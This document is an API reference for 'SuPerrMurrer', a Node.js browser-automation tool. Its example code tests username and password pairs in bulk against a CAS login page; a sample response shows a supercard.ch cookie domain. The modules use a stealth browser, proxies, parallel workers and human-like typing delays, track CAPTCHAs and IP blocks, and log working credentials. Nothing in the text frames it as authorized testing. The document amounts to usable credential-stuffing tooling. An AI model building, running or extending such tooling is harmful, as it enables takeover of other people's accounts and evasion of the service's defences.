# API Reference

Complete API documentation for all modules in SuPerrMurrer.

## Table of Contents

- [Configuration API](#configuration-api)
- [Logger API](#logger-api)
- [CAS Detection API](#cas-detection-api)
- [Form Automation API](#form-automation-api)
- [Error Recovery API](#error-recovery-api)
- [Metrics Collector API](#metrics-collector-api)

---

## Configuration API

### Module: `config.js`

Central configuration export.

#### Export

```javascript
module.exports = {
  browser: { ... },
  proxy: { ... },
  batch: { ... },
  form: { ... },
  navigation: { ... },
  login: { ... },
  account: { ... },
  detection: { ... },
  output: { ... },
  logging: { ... },
  casDetection: { ... },
  context: { ... },
  errorRecovery: { ... },
  test: { ... }
}
```

#### Usage

```javascript
const config = require('./config');

console.log(config.browser.timeout);  // 180000
console.log(config.batch.maxParallelWorkers);  // 4
```

See [Configuration Guide](CONFIGURATION.md) for detailed options.

---

## Logger API

### Module: `logger.js`

### Class: `AdvancedLogger`

Advanced logging system with colored output, progress tracking, and file logging.

#### Constructor

```javascript
new AdvancedLogger(options)
```

**Parameters:**
- `options` (Object)
  - `logDir` (string) - Directory for log files (default: `./logs`)
  - `level` (string) - Log level: `'debug'`, `'info'`, `'warn'`, `'error'` (default: `'info'`)

**Example:**
```javascript
const AdvancedLogger = require('./logger');

const logger = new AdvancedLogger({
  logDir: path.join(process.cwd(), 'logs'),
  level: 'debug'
});
```

#### Methods

##### `log(level, prefix, message, data)`

Low-level logging method.

**Parameters:**
- `level` (string) - Log level: `'debug'`, `'info'`, `'warn'`, `'error'`, `'success'`
- `prefix` (string) - Log prefix (e.g., `'[WORKER]'`)
- `message` (string) - Log message
- `data` (Object, optional) - Additional data to log as JSON

**Example:**
```javascript
logger.log('info', '[SYSTEM]', 'Application started');
logger.log('debug', '[DB]', 'Query executed', { query: 'SELECT * FROM users' });
```

##### `debug(prefix, message, data)`

Log debug message (only shown when `level='debug'`).

**Example:**
```javascript
logger.debug('[API]', 'Request received', { method: 'POST', path: '/login' });
```

##### `info(prefix, message, data)`

Log info message.

**Example:**
```javascript
logger.info('[STARTUP]', 'Server started on port 3000');
```

##### `warn(prefix, message, data)`

Log warning message.

**Example:**
```javascript
logger.warn('[PROXY]', 'Proxy connection slow', { latency: 5000 });
```

##### `error(prefix, message, data)`

Log error message.

**Example:**
```javascript
logger.error('[DATABASE]', 'Connection failed', { error: err.message });
```

##### `success(prefix, message, data)`

Log success message (green output).

**Example:**
```javascript
logger.success('[LOGIN]', 'Authentication successful', { username: 'user@example.com' });
```

##### `progressBar(current, total, prefix, barLength)`

Display progress bar in console.

**Parameters:**
- `current` (number) - Current progress
- `total` (number) - Total items
- `prefix` (string, optional) - Bar prefix (default: `''`)
- `barLength` (number, optional) - Bar width in characters (default: `40`)

**Example:**
```javascript
for (let i = 0; i <= 100; i++) {
  logger.progressBar(i, 100, '[Processing]');
  await sleep(100);
}
logger.clearProgressBar();
```

**Output:**
```
[Processing] [████████████████████████████████████████] 100.0% 100/100
```

##### `clearProgressBar()`

Clear progress bar from console.

**Example:**
```javascript
logger.progressBar(50, 100);
// ... do work ...
logger.clearProgressBar();
logger.info('[DONE]', 'Processing complete');
```

##### `logSuccess(username, password, method, confidence, duration)`

Log successful login attempt.

**Parameters:**
- `username` (string) - Username/email
- `password` (string) - Password
- `method` (string) - Detection method: `'tgc_cookie'`, `'cas_ticket_redirect'`, etc.
- `confidence` (number) - Confidence score (0.0 to 1.0)
- `duration` (number) - Duration in milliseconds

**Example:**
```javascript
logger.logSuccess(
  'user@example.com',
  'password123',
  'tgc_cookie',
  0.99,
  5420
);
```

**Behavior:**
- Only logs if `confidence >= minimumSuccessConfidence`
- Writes to `logs/successful/successes_YYYY-MM-DD.jsonl`
- Updates statistics
- Displays console message

##### `logFailed(username, password, reason, details)`

Log failed login attempt.

**Parameters:**
- `username` (string) - Username/email
- `password` (string) - Password
- `reason` (string) - Failure reason
- `details` (string, optional) - Additional details

**Example:**
```javascript
logger.logFailed(
  'user@example.com',
  'wrongpass',
  'invalid_credentials',
  'Login button not found'
);
```

##### `logBlocked(username, password, reason, batchNum)`

Log blocked account or IP.

**Parameters:**
- `username` (string) - Username/email
- `password` (string) - Password
- `reason` (string) - Block reason
- `batchNum` (number, optional) - Batch number

**Example:**
```javascript
logger.logBlocked(
  'user@example.com',
  'password123',
  'IP blocked by target',
  5
);
```

##### `logCaptcha(username, password, version, batchNum)`

Log CAPTCHA detection.

**Parameters:**
- `username` (string) - Username/email
- `password` (string) - Password
- `version` (string, optional) - CAPTCHA version (default: `'v2'`)
- `batchNum` (number, optional) - Batch number

**Example:**
```javascript
logger.logCaptcha(
  'user@example.com',
  'password123',
  'v2',
  3
);
```

##### `logError(username, password, error, context)`

Log error during credential testing.

**Parameters:**
- `username` (string) - Username/email
- `password` (string) - Password
- `error` (Error) - Error object
- `context` (string, optional) - Error context

**Example:**
```javascript
try {
  await testCredential(username, password);
} catch (error) {
  logger.logError(username, password, error, 'browser_launch');
}
```

##### `exportResults(format)`

Export results to file.

**Parameters:**
- `format` (string) - Export format: `'json'` or `'csv'`

**Example:**
```javascript
// Export JSON
logger.exportResults('json');
// Creates: logs/reports/results_TIMESTAMP.json

// Export CSV
logger.exportResults('csv');
// Creates: logs/reports/successful_YYYY-MM-DD.csv
//          logs/reports/failed_YYYY-MM-DD.csv
```

##### `generateSummaryReport()`

Generate formatted summary report.

**Returns:** (string) Formatted report text

**Example:**
```javascript
const report = logger.generateSummaryReport();
console.log(report);
```

##### `printReport()`

Print and export final report.

**Example:**
```javascript
// At end of processing
logger.printReport();
```

#### Properties

##### `results`

Object containing categorized results:

```javascript
{
  successful: Array<Object>,  // Successful logins
  failed: Array<Object>,       // Failed logins
  blocked: Array<Object>,      // Blocked accounts
  captcha: Array<Object>,      // CAPTCHA encounters
  errors: Array<Object>        // Errors
}
```

##### `stats`

Object containing statistics:

```javascript
{
  totalProcessed: number,
  successful: number,
  failed: number,
  blocked: number,
  captcha: number,
  tgcSuccess: number,
  redirect302Success: number,
  otherSuccess: number,
  startTime: number  // timestamp
}
```

---

## CAS Detection API

### Module: `casDetection.js`

### Function: `submitAndDetectCasFlow(page, username, password, opts)`

Main CAS authentication detection function.

**Parameters:**
- `page` (Page) - Playwright page object
- `username` (string) - Username/email to test
- `password` (string) - Password to test
- `opts` (Object, optional) - Detection options
  - `casLoginPath` (string) - CAS login path (default: `/cas/login`)
  - `accountHost` (string) - Account page hostname
  - `timeoutMs` (number) - Detection timeout (default: `12000`)
  - `tgcCookieNames` (Array<string>) - TGC cookie names (default: `['TGC']`)
  - `verbose` (boolean) - Enable verbose logging (default: `true`)

**Returns:** Promise<Object>

**Response Object:**
```javascript
{
  ok: boolean,              // Success or failure
  type: string,             // 'success', 'failure', 'captcha', 'blocked'
  reason: string,           // Reason code
  confidence: number,       // Confidence score (0.0 to 1.0)
  detectionMethod: string,  // Detection method used
  details: string,          // Human-readable details
  cookie?: Object,          // Cookie details (if TGC detected)
  ticket?: string,          // CAS ticket (if redirect detected)
  duration?: number         // Detection time in ms
}
```

**Example:**
```javascript
const { submitAndDetectCasFlow } = require('./casDetection');

const result = await submitAndDetectCasFlow(
  page,
  'user@example.com',
  'password123',
  {
    tgcCookieNames: ['TGC', 'CASTGC'],
    timeoutMs: 15000,
    verbose: true
  }
);

if (result.ok) {
  console.log(`Success! Method: ${result.detectionMethod}, Confidence: ${result.confidence}`);
} else {
  console.log(`Failed: ${result.reason}`);
}
```

**Success Response:**
```javascript
{
  ok: true,
  type: 'success',
  reason: 'tgc_cookie_detected',
  confidence: 0.99,
  detectionMethod: 'tgc_cookie',
  details: 'CAS Ticket Granting Cookie (TGC) detected: TGC',
  cookie: {
    name: 'TGC',
    domain: '.supercard.ch',
    secure: true,
    valueLength: 64
  },
  duration: 3420
}
```

**Failure Response:**
```javascript
{
  ok: false,
  type: 'failure',
  reason: 'no_success_indicator',
  confidence: 0.0,
  details: 'No authentication success detected within timeout',
  duration: 12000
}
```

**CAPTCHA Response:**
```javascript
{
  ok: false,
  type: 'captcha',
  reason: 'recaptcha_detected',
  confidence: 0.0,
  details: 'reCAPTCHA v2 detected on page',
  duration: 2100
}
```

---

## Form Automation API

### Module: `formFill.js`

### Function: `fastFill(page, selector, text, options)`

Fill form field with realistic typing.

**Parameters:**
- `page` (Page) - Playwright page object
- `selector` (string) - CSS selector for input field
- `text` (string) - Text to fill
- `options` (Object, optional)
  - `typeDelayMin` (number) - Min delay between keystrokes (default: `4`)
  - `typeDelayMax` (number) - Max delay between keystrokes (default: `10`)
  - `clearFirst` (boolean) - Clear field before filling (default: `true`)
  - `logPrefix` (string) - Log prefix (default: `'[fastFill]'`)

**Returns:** Promise<boolean> - `true` if successful, `false` otherwise

**Example:**
```javascript
const { fastFill } = require('./formFill');

const success = await fastFill(
  page,
  '#username',
  'user@example.com',
  {
    typeDelayMin: 5,
    typeDelayMax: 15,
    clearFirst: true
  }
);

if (success) {
  console.log('Field filled successfully');
} else {
  console.error('Field fill failed');
}
```

**Fallback Strategy:**
1. Character-by-character typing with delays
2. `page.fill()` method
3. Direct DOM manipulation

### Function: `fillForm(page, fieldMap, options)`

Fill multiple form fields.

**Parameters:**
- `page` (Page) - Playwright page object
- `fieldMap` (Object) - Map of selector to value
- `options` (Object, optional) - Same as `fastFill`

**Returns:** Promise<Object>

**Response:**
```javascript
{
  success: boolean,     // All fields filled successfully
  filled: number,       // Number of fields filled
  total: number         // Total number of fields
}
```

**Example:**
```javascript
const { fillForm } = require('./formFill');

const result = await fillForm(
  page,
  {
    '#username': 'user@example.com',
    '#password': 'password123',
    '#remember': 'true'
  },
  {
    typeDelayMin: 3,
    typeDelayMax: 8
  }
);

console.log(`Filled ${result.filled}/${result.total} fields`);
```

---

## Form Submit API

### Module: `formSubmit.js`

### Function: `findAndClickSubmitButton(page, logPrefix)`

Find and click submit button using multiple strategies.

**Parameters:**
- `page` (Page) - Playwright page object
- `logPrefix` (string, optional) - Log prefix (default: `'[submit]'`)

**Returns:** Promise<Object>

**Response:**
```javascript
{
  success: boolean,
  method: string,      // 'css_selector', 'xpath', 'text', 'form_submit', 'enter_key'
  selector?: string,   // Selector used (if applicable)
  details: string      // Description
}
```

**Example:**
```javascript
const { findAndClickSubmitButton } = require('./formSubmit');

const result = await findAndClickSubmitButton(page, '[LOGIN]');

if (result.success) {
  console.log(`Submitted via ${result.method}`);
} else {
  console.error('Submit failed');
}
```

**Strategies (in order):**
1. CSS selectors from `config.login.submitSelectors`
2. XPath from `config.login.submitXPath`
3. Button text matching
4. Form submission
5. Enter key press

### Function: `detectRecaptcha(page)`

Detect reCAPTCHA on page.

**Parameters:**
- `page` (Page) - Playwright page object

**Returns:** Promise<Object|null>

**Response:**
```javascript
{
  detected: boolean,
  version: string,     // 'v2', 'v3', 'enterprise'
  selector: string     // CSS selector of CAPTCHA element
}
```

**Example:**
```javascript
const { detectRecaptcha } = require('./formSubmit');

const captcha = await detectRecaptcha(page);

if (captcha) {
  console.log(`reCAPTCHA ${captcha.version} detected`);
  // Handle CAPTCHA
} else {
  console.log('No CAPTCHA detected');
}
```

---

## Error Recovery API

### Module: `errorRecovery.js`

### Function: `retryWithBackoff(fn, options)`

Retry async function with exponential backoff.

**Parameters:**
- `fn` (Function) - Async function to retry
- `options` (Object, optional)
  - `maxRetries` (number) - Max retry attempts (default: `3`)
  - `onRetry` (Function) - Callback on retry: `(error, attempt, delay) => {}`
  - `shouldRetry` (Function) - Determine if should retry: `(error, attempt) => boolean`
  - `logPrefix` (string) - Log prefix (default: `'[Retry]'`)
  - `verbose` (boolean) - Verbose logging (default: `false`)

**Returns:** Promise<any> - Function result

**Throws:** Last error if all retries fail

**Example:**
```javascript
const { retryWithBackoff } = require('./errorRecovery');

const result = await retryWithBackoff(
  async () => {
    return await fetchData();
  },
  {
    maxRetries: 5,
    onRetry: (error, attempt, delay) => {
      console.log(`Retry ${attempt} after ${delay}ms: ${error.message}`);
    },
    shouldRetry: (error, attempt) => {
      // Retry on network errors, not on auth errors
      return error.message.includes('ECONNREFUSED');
    },
    verbose: true
  }
);
```

**Backoff Calculation:**
```
delay = min(base^attempt * 1000, maxBackoffDelay)

Example with base=2, max=30000:
  Attempt 0: 1000ms (1s)
  Attempt 1: 2000ms (2s)
  Attempt 2: 4000ms (4s)
  Attempt 3: 8000ms (8s)
  Attempt 4: 16000ms (16s)
  Attempt 5: 30000ms (30s, capped)
```

### Function: `calculateBackoffDelay(attempt)`

Calculate exponential backoff delay.

**Parameters:**
- `attempt` (number) - Current attempt (0-indexed)

**Returns:** (number) Delay in milliseconds

**Example:**
```javascript
const { calculateBackoffDelay } = require('./errorRecovery');

for (let i = 0; i < 5; i++) {
  const delay = calculateBackoffDelay(i);
  console.log(`Attempt ${i}: wait ${delay}ms`);
}
```

### Function: `classifyError(error)`

Classify error type for handling.

**Parameters:**
- `error` (Error) - Error object

**Returns:** (Object) Error classification

**Response:**
```javascript
{
  type: string,         // 'NETWORK', 'TIMEOUT', 'BLOCKED', 'NOT_FOUND', 'BROWSER_CRASH', 'UNKNOWN'
  category: string,     // Error category
  isTransient: boolean, // Can occur temporarily
  recoverable: boolean  // Should retry
}
```

**Example:**
```javascript
const { classifyError } = require('./errorRecovery');

try {
  await operation();
} catch (error) {
  const classification = classifyError(error);
  
  if (classification.recoverable) {
    console.log(`Retrying ${classification.type} error`);
    await retry(operation);
  } else {
    console.error(`Fatal ${classification.type} error`);
    throw error;
  }
}
```

---

## Metrics Collector API

### Module: `metricsCollector.js`

### Class: `MetricsCollector`

Real-time metrics collection and reporting.

#### Constructor

```javascript
new MetricsCollector(options)
```

**Parameters:**
- `options` (Object, optional)
  - `metricsInterval` (number) - Reporting interval (default: `30000`)
  - `enableConsoleOutput` (boolean) - Enable console output (default: `true`)

**Example:**
```javascript
const MetricsCollector = require('./metricsCollector');

const metrics = new MetricsCollector({
  metricsInterval: 60000,  // Report every minute
  enableConsoleOutput: true
});
```

#### Methods

##### `record(event, data)`

Record an event.

**Parameters:**
- `event` (string) - Event type
- `data` (Object, optional) - Event data

**Events:**
- `'login_success'` - Successful login
- `'login_failed'` - Failed login
- `'captcha'` - CAPTCHA detected
- `'blocked'` - Account/IP blocked
- `'proxy_failure'` - Proxy error
- `'navigation_error'` - Navigation error
- `'screenshot_failure'` - Screenshot error
- `'tunnel_error'` - Tunnel error
- `'batch_complete'` - Batch finished

**Example:**
```javascript
// Record success
metrics.record('login_success', {
  duration: 3420,
  method: 'tgc_cookie'
});

// Record failure
metrics.record('login_failed', {
  reason: 'invalid_credentials'
});

// Record CAPTCHA
metrics.record('captcha', {
  version: 'v2'
});
```

##### `getMetrics()`

Get current metrics snapshot.

**Returns:** (Object) Current metrics

**Example:**
```javascript
const current = metrics.getMetrics();

console.log(`Success rate: ${(current.successfulLogins / current.totalAttempts * 100).toFixed(2)}%`);
console.log(`Avg response time: ${current.avgResponseTime}ms`);
```

##### `reset()`

Reset all metrics.

**Example:**
```javascript
metrics.reset();
console.log('Metrics reset');
```

---

## Usage Examples

### Complete Credential Testing Flow

```javascript
const { chromium } = require('patchright');
const AdvancedLogger = require('./logger');
const { fastFill } = require('./formFill');
const { findAndClickSubmitButton } = require('./formSubmit');
const { submitAndDetectCasFlow } = require('./casDetection');
const { retryWithBackoff } = require('./errorRecovery');
const config = require('./config');

// Initialize logger
const logger = new AdvancedLogger({
  logDir: './logs',
  level: 'info'
});

// Test credential
async function testCredential(username, password) {
  const browser = await chromium.launch({
    headless: false,
    channel: 'chrome'
  });
  
  try {
    const page = await browser.newPage();
    
    // Navigate to login page
    await page.goto(config.login.url, {
      timeout: config.navigation.timeout
    });
    
    // Fill form
    await fastFill(page, config.login.usernameSelector, username);
    await fastFill(page, config.login.passwordSelector, password);
    
    // Submit and detect
    const result = await submitAndDetectCasFlow(page, username, password, {
      timeoutMs: config.detection.cas.timeout
    });
    
    // Log result
    if (result.ok) {
      logger.logSuccess(username, password, result.detectionMethod, result.confidence, result.duration);
    } else if (result.type === 'captcha') {
      logger.logCaptcha(username, password);
    } else if (result.type === 'blocked') {
      logger.logBlocked(username, password, result.reason);
    } else {
      logger.logFailed(username, password, result.reason);
    }
    
    return result;
    
  } finally {
    await browser.close();
  }
}

// Run with retry
await retryWithBackoff(
  () => testCredential('user@example.com', 'password123'),
  { maxRetries: 3 }
);
```

---

**Next:** [Configuration Guide](CONFIGURATION.md) | [Detection Strategies](DETECTION.md)
